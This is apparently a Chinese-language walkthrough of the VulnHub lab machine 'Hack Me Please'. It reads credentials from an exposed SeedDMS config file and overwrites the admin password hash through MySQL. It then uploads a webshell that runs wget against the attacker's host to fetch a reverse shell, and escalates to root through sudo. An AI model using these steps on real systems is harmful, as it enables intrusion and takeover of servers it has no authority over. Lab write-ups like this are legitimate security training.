# Hack Me Please
> URL : https://www.vulnhub.com/entry/hack-me-please-1,731/


IP : 192.168.1.111

## Recon
- 掃 Port
	- `rustscan -a 192.168.1.111`
		- ![](https://i.imgur.com/GQ3XhCP.png)
	- `nmap -A -p80,3306,33060 192.168.1.111`
		- ![](https://i.imgur.com/NgbBNJB.png)

- 掃 Dir
	- `python3 dirsearch.py -u http://192.168.1.111/`
		- ![](https://i.imgur.com/nC8b3F5.png)
		- 看不出啥特別ㄉ
- 觀察首頁
	- ![](https://i.imgur.com/qfWookP.png)
- 觀察 `main.js`
	- ![](https://i.imgur.com/Gnuznh1.png)
	- 發現註解寫了一個 `/seeddms51x/seeddms-5.1.22` 的路徑
		- ![](https://i.imgur.com/mUDfth8.png)
## DMS
- 掃路徑發現有 `install` 等資訊
	- ![](https://i.imgur.com/zidhCez.png)
- 觀察原始碼
	- ![](https://i.imgur.com/fb02TAU.png)
	- 到 SorceForge 下載原始碼
- 觀察路徑
	- ![](https://i.imgur.com/Ry12QOc.png)
	- 發現路徑內有 `/conf/` 可能有重要的資訊
- `/conf/settings.xml` 可以存取
	- 裡面找到 mysql 的帳密 `seeddms`
## MySQL
- 進行 MySQL 連線
	- ![](https://i.imgur.com/9kPLyD2.png)
- 觀察 DB
	- ![](https://i.imgur.com/1949mIG.png)
- 觀察表格
	- ![](https://i.imgur.com/tKUTHXI.png)
- `users`
	- ![](https://i.imgur.com/pw1MWYq.png)
	- ![](https://i.imgur.com/GibIYc2.png)
	- 找到一組帳密
		- `saket`
		- `saurav`
		- `Saket@#$1337`
	- 但登入 DMS 失敗
- 找到 `tblUsers`
	- ![](https://i.imgur.com/3tdrjpv.png)
	- 分析 hash
	- ![](https://i.imgur.com/iyjvDSu.png)
		- 應該是 md5
- 哈希貓爆破
	- ![](https://i.imgur.com/I5MAAw3.png)
	- 爆不出來QQ
- 自己創一個使用者
	```mysql
	INSERT INTO tblUsers
	(id,login,pwd,fullName,email,role,language,theme,comment)
	VALUES
	(3,"meow","4a4be40c96ac6314e91d93f38043a634","Meow","meow@meow.meow",1,"en_US",0,0);
	```
	- ![](https://i.imgur.com/vF0oItn.png)
	- ![](https://i.imgur.com/ahHqKQA.png)
		- 可以登入，但畫面是白的 QQ
- 改使用者密碼
	- 原本是 `f9ef2c539bad8a6d2f3432b6d49ab51a`
		- 先存著備用，怕以後要用到
	- `update tblUsers set pwd='4a4be40c96ac6314e91d93f38043a634' where id=1;`
		- ![](https://i.imgur.com/PAzpNXC.png)
		- 就登入成功ㄌ
	- 上傳 webshell
- 因為 `seeddms51x` 目錄沒有鎖權限
	- 根據觀察，檔案會存在 `http://192.168.1.111/seeddms51x/data/1048576/{檔案ID}/1.{檔案附檔名}`
		- ![](https://i.imgur.com/8K0Y0IX.png)
- 載 Reverse shell
	- http://192.168.1.111/seeddms51x/data/1048576/4/1.php?A=wget%20192.168.1.109:8000/s_l
- 接上 Reverse shell
	- 使用交互式
		- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
	- 切換使用者
		- ![](https://i.imgur.com/sU18oMU.png)
		- 使用當初 DB 看到的密碼
- 提權
	- `sudo -l` 發現可以直接成為 root
		- ![](https://i.imgur.com/Q9bgJGa.png)
